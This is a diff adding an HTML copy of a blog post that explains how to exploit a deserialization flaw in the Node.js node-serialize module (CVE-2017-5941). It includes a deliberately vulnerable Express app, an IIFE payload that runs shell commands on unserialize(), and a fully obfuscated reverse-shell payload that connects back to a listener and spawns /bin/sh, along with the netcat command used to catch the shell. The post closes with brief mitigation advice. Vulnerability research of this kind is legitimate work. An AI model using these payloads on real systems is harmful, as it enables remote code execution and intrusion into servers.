@@ -1,0 +1,105 @@
+
+        <!doctype html>
+        <html>
+        <head>
+            <meta charset="utf-8"/>
+            <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+            <title>Exploiting Node.js deserialization bug for Remote Code Execution</title>
+            <link rel="stylesheet" href="../css/article.css" />;
+        </head>
+        <body>
+            <div class="m-content">
+                <h1>Exploiting Node.js deserialization bug for Remote Code Execution</h1>
+                <section class="entry fix">
+	                	<h3><strong>tl;dr</strong></h3>
+<p>Untrusted data&nbsp;passed into&nbsp;<code>unserialize()</code> function &nbsp;in node-serialize module can be exploited to achieve&nbsp;arbitrary&nbsp;code execution&nbsp;by passing a serialized JavaScript Object with an&nbsp;Immediately invoked function expression (IIFE).</p>
+<h3><strong>The Bug</strong></h3>
+<p><span>During a Node.js code review, I happen to see a serialization/deserialization module named </span><a href="https://www.npmjs.com/package/node-serialize"><span>node-serialize</span></a><span>. A cookie value that comes from the request was passed into the </span><span><code>unserialize()</code></span><span> function provided by the module. Here is a sample node.js application to imitate the code:</span><span><br></span></p>
+<pre class="brush: jscript; title: ; notranslate" title="">var express = require('express');
+var cookieParser = require('cookie-parser');
+var escape = require('escape-html');
+var serialize = require('node-serialize');
+var app = express();
+app.use(cookieParser())
+
+app.get('/', function(req, res) {
+ if (req.cookies.profile) {
+   var str = new Buffer(req.cookies.profile, 'base64').toString();
+   var obj = serialize.unserialize(str);
+   if (obj.username) {
+     res.send("Hello " + escape(obj.username));
+   }
+ } else {
+     res.cookie('profile', "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=", {
+       maxAge: 900000,
+       httpOnly: true
+     });
+ }
+ res.send("Hello World");
+});
+app.listen(3000);
+</pre>
+
+<p><span>Java, PHP, Ruby&nbsp;and Python have&nbsp;a fair share of Deserialization bugs. Some resources&nbsp;explaining these issues:&nbsp;</span></p>
+<p><a href="https://securitycafe.ro/2015/01/05/understanding-php-object-injection/"><span>Understanding PHP Object Injection<br></span></a><a href="https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet"><span>Java Deserialization Cheat Sheet<br></span></a><a href="http://blog.codeclimate.com/blog/2013/01/10/rails-remote-code-execution-vulnerability-explained/"><span>Rails Remote Code Execution Vulnerability Explained<br></span></a><a href="https://www.cs.uic.edu/~s/musings/pickle/"><span>Arbitrary code execution with Python pickles</span></a></p>
+<p><span>However I couldn’t find any resource that explained deserialization/object injection bugs in Node.js. I thought to do some research on this and after spending some time I was able to exploit a&nbsp;deserialization bug to achieve arbitrary code injection.</span></p>
+<h3><b>Building the Payload</b></h3>
+<p><span>I have used node-serialize version 0.0.4 for this research</span><b>. </b><span>For successful exploitation, arbitrary code execution should occur&nbsp;when untrusted input is passed into </span><span><code>unserialize()</code></span><span> function. The best way to create a payload is to use the</span><span> <code>serialize()</code>&nbsp;</span><span>function of the same module. </span></p>
+<p><span>I created the following JavaScript object and passed it to</span><span> <code>serialize()</code></span><span> function.<br></span><span><br></span></p>
+<pre class="brush: jscript; title: ; notranslate" title="">var y = {
+ rce : function(){
+ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
+ },
+}
+var serialize = require('node-serialize');
+console.log("Serialized: \n" + serialize.serialize(y));
+</pre>
+<p><span>Which gives the following output.</span></p>
+<p><img class="alignnone size-full wp-image-1117" src="https://opsecx.com/wp-content/uploads/2017/02/Screen-Shot-2017-02-08-at-9.45.02-PM.png" alt="" width="1148" height="122" srcset="https://opsecx.com/wp-content/uploads/2017/02/Screen-Shot-2017-02-08-at-9.45.02-PM.png 1148w, https://opsecx.com/wp-content/uploads/2017/02/Screen-Shot-2017-02-08-at-9.45.02-PM-300x32.png 300w, https://opsecx.com/wp-content/uploads/2017/02/Screen-Shot-2017-02-08-at-9.45.02-PM-768x82.png 768w, https://opsecx.com/wp-content/uploads/2017/02/Screen-Shot-2017-02-08-at-9.45.02-PM-1024x109.png 1024w, https://opsecx.com/wp-content/uploads/2017/02/Screen-Shot-2017-02-08-at-9.45.02-PM-100x11.png 100w" sizes="(max-width: 1148px) 100vw, 1148px"><br><span><br></span><span>Now we have a serialized string that can be deserialized with </span><span><code>unserialize()</code>&nbsp;</span><span>function. But the problem is code execution won’t happen until you trigger the function corresponding to the&nbsp;</span><span><code>rce</code></span><span>&nbsp;property of the object.</span><span><br></span><span><br></span><span>Later I figured out that we can use JavaScript’s </span><a href="https://en.wikipedia.org/wiki/Immediately-invoked_function_expression)"><span>Immediately invoked function expression (IIFE)</span></a><span> for calling the function. If we use IIFE bracket </span><span><code>()</code></span><span>after the function body, the function will get invoked when the object is created. It works similar to a Class constructor in C++.<br></span><span><br></span><span>Now the</span><span> <code>serialize()</code></span><span> function with the modified object code is called.</span></p>
+<pre class="brush: jscript; title: ; notranslate" title="">var y = {
+rce : function(){
+require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
+}(),
+}
+var serialize = require('node-serialize');
+console.log("Serialized: \n" + serialize.serialize(y));
+</pre>
+<p><span>The following output was obtained</span><span><br></span><span><br></span><span><img class="alignnone wp-image-1172 size-full" src="https://opsecx.com/wp-content/uploads/2017/02/if.png" width="1646" height="950" srcset="https://opsecx.com/wp-content/uploads/2017/02/if.png 1646w, https://opsecx.com/wp-content/uploads/2017/02/if-300x173.png 300w, https://opsecx.com/wp-content/uploads/2017/02/if-768x443.png 768w, https://opsecx.com/wp-content/uploads/2017/02/if-1024x591.png 1024w, https://opsecx.com/wp-content/uploads/2017/02/if-100x58.png 100w" sizes="(max-width: 1646px) 100vw, 1646px"><br></span><span><br></span><span>The IIFE worked fine but the serialization failed. So I tried adding bracket </span><span><code>()</code></span><span> after the function body of the previously serialized string and passed it to </span><span><code>unserialize()</code></span><span> function and lucky it worked. So we have the exploit payload:</span></p>
+<pre>{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /',
+function(error, stdout, stderr) { console.log(stdout) });\n }<span>()</span>"}</pre>
+<p><span>Passing it to </span><span><code>unserialize()</code></span><span> function will result in code execution.</span></p>
+<pre class="brush: jscript; title: ; notranslate" title="">var serialize = require('node-serialize');
+var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
+serialize.unserialize(payload);
+</pre>
+<p><img class="alignnone size-full wp-image-1127" src="https://opsecx.com/wp-content/uploads/2017/02/Screen-Shot-2017-02-08-at-10.05.42-PM.png" alt="" width="1096" height="564" srcset="https://opsecx.com/wp-content/uploads/2017/02/Screen-Shot-2017-02-08-at-10.05.42-PM.png 1096w, https://opsecx.com/wp-content/uploads/2017/02/Screen-Shot-2017-02-08-at-10.05.42-PM-300x154.png 300w, https://opsecx.com/wp-content/uploads/2017/02/Screen-Shot-2017-02-08-at-10.05.42-PM-768x395.png 768w, https://opsecx.com/wp-content/uploads/2017/02/Screen-Shot-2017-02-08-at-10.05.42-PM-1024x527.png 1024w, https://opsecx.com/wp-content/uploads/2017/02/Screen-Shot-2017-02-08-at-10.05.42-PM-100x51.png 100w" sizes="(max-width: 1096px) 100vw, 1096px"></p>
+<p><span>Now we know that we can exploit </span><span><code>unserialize()</code></span><span>function in node-serialize module, if untrusted data passed into it. Let’s exploit the vulnerability in the web application to spawn a reverse shell.<br></span></p>
+<h3><strong>Further Exploitation</strong></h3>
+<p><span>The vulnerability in the web application is that it reads a cookie named profile from the HTTP request, perform base64 decode of the cookie value and pass it to</span><span> <code>unserialize()</code></span><span>function. As cookie is an untrusted input, an attacker can craft malicious cookie value to exploit this vulnerability.</span><span><br></span><span><br></span><span>I used&nbsp;</span><a href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py"><span>nodejsshell.py</span></a><span> for generating a reverse shell payload.</span></p>
+<pre>$ python nodejsshell.py 127.0.0.1 1337
+
+[+] LHOST = 127.0.0.1
+
+[+] LPORT = 1337
+
+[+] Encoding
+
+eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,50,55,46,48,46,48,46,49,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
+</pre>
+<p><span><br></span><span>Now let’s generate the serialized payload and add IIFE brackets&nbsp;</span><span><code>()</code></span><span> after the function body.</span></p>
+<pre>{"rce":"_$$ND_FUNC$$_function (){ eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,50,55,46,48,46,48,46,49,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}<span>()</span>"}
+</pre>
+<p><span>We need to perform Base64 encode of the same, and then make a request to the web server with encoded payload in the Cookie header.</span><span><br></span></p>
+<p><span><img class="alignnone size-full wp-image-1128" src="https://opsecx.com/wp-content/uploads/2017/02/Screen-Shot-2017-02-08-at-10.36.39-PM.png" alt="" width="2510" height="1180" srcset="https://opsecx.com/wp-content/uploads/2017/02/Screen-Shot-2017-02-08-at-10.36.39-PM.png 2510w, https://opsecx.com/wp-content/uploads/2017/02/Screen-Shot-2017-02-08-at-10.36.39-PM-300x141.png 300w, https://opsecx.com/wp-content/uploads/2017/02/Screen-Shot-2017-02-08-at-10.36.39-PM-768x361.png 768w, https://opsecx.com/wp-content/uploads/2017/02/Screen-Shot-2017-02-08-at-10.36.39-PM-1024x481.png 1024w, https://opsecx.com/wp-content/uploads/2017/02/Screen-Shot-2017-02-08-at-10.36.39-PM-100x47.png 100w" sizes="(max-width: 2510px) 100vw, 2510px"><br></span><span><br></span><span>We can now listen for a shell </span><span><br></span><span><br></span><span><code>nc -l 127.0.0.1 1337</code></span></p>
+<p><img class="alignnone size-full wp-image-1129" src="https://opsecx.com/wp-content/uploads/2017/02/Screen-Shot-2017-02-08-at-10.40.00-PM.png" alt="" width="970" height="712" srcset="https://opsecx.com/wp-content/uploads/2017/02/Screen-Shot-2017-02-08-at-10.40.00-PM.png 970w, https://opsecx.com/wp-content/uploads/2017/02/Screen-Shot-2017-02-08-at-10.40.00-PM-300x220.png 300w, https://opsecx.com/wp-content/uploads/2017/02/Screen-Shot-2017-02-08-at-10.40.00-PM-768x564.png 768w, https://opsecx.com/wp-content/uploads/2017/02/Screen-Shot-2017-02-08-at-10.40.00-PM-100x73.png 100w" sizes="(max-width: 970px) 100vw, 970px"></p>
+<p><span>And now we have a reverse shell!</span></p>
+<h3><b>Exploitation Video<br></b><br></h3>
+<h3><b>Final Thoughts</b></h3>
+<p><span>We exploited a deserialization bug to achieve arbitrary code execution with untrusted user input.&nbsp;The Rule of thumb is never to deserialize untrusted user input. The root cause is that it was using <code>eval()</code> internally for deserialization. I also&nbsp;found a similar bug in another</span><span>&nbsp;module named&nbsp;</span><a href="https://www.npmjs.com/package/serialize-to-js"><span>serialize-to-js</span></a><span>. </span><span>In that module,</span><span>&nbsp;the <code>require()</code> function in Node.js has no scope during deserialization of an object with IIFE and they were using <code>new Function()</code> internally for deserialization. We can still achieve code execution with a slightly complex payload.</span></p>
+<h3><strong>Update</strong></h3>
+<p>Deserialization bug in node-serialize&nbsp;function is assigned&nbsp;<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941">CVE-2017-5941</a><br>Deserialization bug in serialize-to-js&nbsp;function is assigned&nbsp;<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5954">CVE-2017-5954</a></p>
+											</section>
+            </div>
+            <script>var _gaq = _gaq || []; _gaq.push(['_setAccount', 'UA-34802167-1']); _gaq.push(['_setDomainName', 'liuzhe.co']); _gaq.push(['_trackPageview']); (function() { var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true; ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js'; var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s); })();</script>
+        </body>
+        </html>
